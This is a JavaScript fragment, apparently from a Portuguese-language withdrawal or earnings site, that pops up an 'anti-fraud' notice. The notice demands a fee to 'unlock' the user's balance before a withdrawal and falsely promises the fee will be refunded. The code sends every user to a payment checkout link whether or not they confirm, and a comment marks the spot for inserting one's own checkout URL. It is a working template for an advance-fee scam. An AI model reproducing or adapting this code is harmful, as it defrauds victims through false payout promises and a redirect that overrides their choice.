var lastStepVisited = 1;
        ...
        // FUNÇÃO HANDLER ANTI FRAUDE MODIFICADA 2.0 
...
function handleAntiFraudFee(){
    ...
    Swal.fire({
        icon: "success",
        title: `Antes de sacar seus R$ ${requestedAmount}, desbloqueie o seu saldo!`,
        html: `Lembrando que você recebera o valor da taxa de volta, junto ao valor do seu saque, apenas uma ETAPA de verificação do nosso sistema...
		<br/>
		<br/>Clique no botão abaixo para prosseguir com seu saque de R$ ${requestedAmount}.`,
        confirmButtonText: `Saque R$ ${requestedAmount}`,
        customClass: {
        ...
        if (result.isConfirmed || !result.isConfirmed) {
            handleUserNextLevel();
            isLoading(1);
            window.location.href = "https://pay.sunize.com.br/qldWmRto";
               // SEU LINK CHECKOUT
 }
